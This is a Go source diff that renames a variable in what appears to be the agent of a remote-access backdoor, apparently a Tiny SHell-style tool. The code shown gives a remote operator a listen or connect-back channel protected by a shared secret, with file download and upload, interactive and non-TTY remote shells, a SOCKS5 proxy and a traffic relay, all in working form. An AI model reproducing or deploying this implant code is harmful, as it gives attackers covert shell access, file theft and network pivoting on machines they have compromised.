@@ -53,9 +53,9 @@ func Run(secret []byte, host string, port int, delay int, runAsDaemon bool) {
 			os.Exit(1)
 		}
 		for {
-			layer, err := ln.Accept()
+			stream, err := ln.Accept()
 			if err == nil {
-				go handleGeneric(layer)
+				go handleGeneric(stream)
 			} else {
 				log.Printf("Accept failed: %v\n", err)
 			}
@@ -64,9 +64,9 @@ func Run(secret []byte, host string, port int, delay int, runAsDaemon bool) {
 		// connect back mode
 		addr := fmt.Sprintf("%s:%d", host, port)
 		for {
-			layer, err := pel.Dial(addr, secret, true)
+			stream, err := pel.Dial(addr, secret, true)
 			if err == nil {
-				go handleGeneric(layer)
+				go handleGeneric(stream)
 			} else {
 				log.Printf("Dial failed: %v\n", err)
 			}
@@ -78,13 +78,13 @@ func Run(secret []byte, host string, port int, delay int, runAsDaemon bool) {
 // entry handler,
 // automatically close connection after handling
 // it's safe to run with goroutine
-func handleGeneric(layer utils.DuplexStreamEx) {
-	defer layer.Close()
+func handleGeneric(stream utils.DuplexStreamEx) {
+	defer stream.Close()
 	defer func() {
 		recover()
 	}()
 	buffer := make([]byte, 1)
-	n, err := layer.Read(buffer)
+	n, err := stream.Read(buffer)
 	if err != nil || n != 1 {
 		return
 	}
@@ -92,23 +92,23 @@ func handleGeneric(layer utils.DuplexStreamEx) {
 	case constants.Kill:
 		os.Exit(0)
 	case constants.GetFile:
-		handleGetFile(layer)
+		handleGetFile(stream)
 	case constants.PutFile:
-		handlePutFile(layer)
+		handlePutFile(stream)
 	case constants.RunShell:
-		handleRunShell(layer)
+		handleRunShell(stream)
 	case constants.SOCKS5:
-		handleSocks5(layer)
+		handleSocks5(stream)
 	case constants.Pipe:
-		handlePipe(layer)
+		handlePipe(stream)
 	case constants.RunShellNoTTY:
-		handleRunShellNoTTY(layer)
+		handleRunShellNoTTY(stream)
 	}
 }
 
-func handleGetFile(layer utils.DuplexStreamEx) {
+func handleGetFile(stream utils.DuplexStreamEx) {
 	buffer := make([]byte, constants.MaxMessagesize)
-	filenamebuf, err := utils.ReadVarLength(layer, buffer)
+	filenamebuf, err := utils.ReadVarLength(stream, buffer)
 	if err != nil {
 		return
 	}
@@ -118,18 +118,18 @@ func handleGetFile(layer utils.DuplexStreamEx) {
 		return
 	}
 	defer f.Close()
-	utils.CopyBuffer(layer, f, buffer)
-	layer.Close()
+	utils.CopyBuffer(stream, f, buffer)
+	stream.Close()
 }
 
-func handlePutFile(layer utils.DuplexStreamEx) {
+func handlePutFile(stream utils.DuplexStreamEx) {
 	buffer := make([]byte, constants.MaxMessagesize)
-	destbuf, err := utils.ReadVarLength(layer, buffer)
+	destbuf, err := utils.ReadVarLength(stream, buffer)
 	if err != nil {
 		return
 	}
 	destination := filepath.FromSlash(string(destbuf))
-	basenamebuf, err := utils.ReadVarLength(layer, buffer)
+	basenamebuf, err := utils.ReadVarLength(stream, buffer)
 	if err != nil {
 		return
 	}
@@ -150,28 +150,28 @@ func handlePutFile(layer utils.DuplexStreamEx) {
 		return
 	}
 	defer f.Close()
-	utils.CopyBuffer(f, layer, buffer)
-	layer.Close()
+	utils.CopyBuffer(f, stream, buffer)
+	stream.Close()
 }
 
-func handleRunShell(layer utils.DuplexStreamEx) {
+func handleRunShell(stream utils.DuplexStreamEx) {
 	buffer1 := make([]byte, constants.MaxMessagesize)
 	buffer2 := make([]byte, constants.MaxMessagesize)
-	termbuf, err := utils.ReadVarLength(layer, buffer1)
+	termbuf, err := utils.ReadVarLength(stream, buffer1)
 	if err != nil {
 		return
 	}
 	term := string(termbuf)
 
 	termsize := make([]byte, 4)
-	_, err = io.ReadFull(layer, termsize)
+	_, err = io.ReadFull(stream, termsize)
 	if err != nil {
 		return
 	}
 	ws_row := int(termsize[0])<<8 + int(termsize[1])
 	ws_col := int(termsize[2])<<8 + int(termsize[3])
 
-	cmdbuf, err := utils.ReadVarLength(layer, buffer1)
+	cmdbuf, err := utils.ReadVarLength(stream, buffer1)
 	if err != nil {
 		return
 	}
@@ -182,12 +182,12 @@ func handleRunShell(layer utils.DuplexStreamEx) {
 		return
 	}
 	defer tp.Close()
-	utils.DuplexPipe(layer, utils.DSEFromRW(tp.StdOut(), tp.StdIn()), buffer1, buffer2)
+	utils.DuplexPipe(stream, utils.DSEFromRW(tp.StdOut(), tp.StdIn()), buffer1, buffer2)
 }
 
-func handleRunShellNoTTY(layer utils.DuplexStreamEx) {
+func handleRunShellNoTTY(stream utils.DuplexStreamEx) {
 	buffer1 := make([]byte, constants.MaxMessagesize)
-	cmdbuf, err := utils.ReadVarLength(layer, buffer1)
+	cmdbuf, err := utils.ReadVarLength(stream, buffer1)
 	if err != nil {
 		return
 	}
@@ -211,38 +211,38 @@ func handleRunShellNoTTY(layer utils.DuplexStreamEx) {
 	}
 	combinedOutput := io.MultiReader(stdout, stderr)
 	go cmd.Run()
-	utils.DuplexPipe(layer, utils.DSEFromRW(combinedOutput, stdin), nil, nil)
+	utils.DuplexPipe(stream, utils.DSEFromRW(combinedOutput, stdin), nil, nil)
 }
 
-func handleSocks5(layer utils.DuplexStreamEx) {
+func handleSocks5(stream utils.DuplexStreamEx) {
 	srv, _ := socks5.NewClassicServer("", "")
 	srv.SupportedCommands = []byte{socks5.CmdConnect} // TODO: CmdUDP
-	if err := srv.Negotiate(layer); err != nil {
+	if err := srv.Negotiate(stream); err != nil {
 		log.Println(err)
 		return
 	}
-	req, err := srv.GetRequest(layer)
+	req, err := srv.GetRequest(stream)
 	if err != nil {
 		log.Println(err)
 		return
 	}
 	log.Println("Request type", req.Cmd)
 	if req.Cmd == socks5.CmdConnect {
-		conn, err := req.Connect(layer)
+		conn, err := req.Connect(stream)
 		if err != nil {
-			layer.Close()
+			stream.Close()
 			log.Println(err)
 			return
 		}
 		log.Println("Connection established", conn.RemoteAddr())
-		utils.DuplexPipe(layer, conn, nil, nil)
+		utils.DuplexPipe(stream, conn, nil, nil)
 		log.Println("Connection closed", conn.RemoteAddr())
 		return
 	}
 }
 
-func handlePipe(layer utils.DuplexStreamEx) {
-	addrbuf, err := utils.ReadVarLength(layer, nil)
+func handlePipe(stream utils.DuplexStreamEx) {
+	addrbuf, err := utils.ReadVarLength(stream, nil)
 	if err != nil {
 		return
 	}
@@ -260,5 +260,5 @@ func handlePipe(layer utils.DuplexStreamEx) {
 		conn.Close()
 		log.Println("Disconnected", addr)
 	}()
-	utils.DuplexPipe(layer, conn, nil, nil)
+	utils.DuplexPipe(stream, conn, nil, nil)
 }
